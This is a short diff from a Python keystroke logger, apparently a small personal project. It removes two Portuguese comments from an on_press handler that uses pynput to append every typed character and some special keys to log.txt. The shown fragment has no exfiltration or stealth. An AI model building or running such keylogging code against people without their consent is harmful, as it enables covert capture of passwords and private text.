@@ -8,12 +8,10 @@ IGNORAR = {keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l,
 
 def on_press(key):
     try:
-        #se for uma tecla "normal"(letra,número,símbolo) 
         with open("log.txt", "a", encoding="utf-8") as log_file:
             log_file.write(key.char)
 
     except AttributeError:
-        # Se for uma tecla especial (não tem o atributo .char)
         with open("log.txt", "a", encoding="utf-8") as log_file:
             if key == keyboard.Key.space:
                 log_file.write(" ")
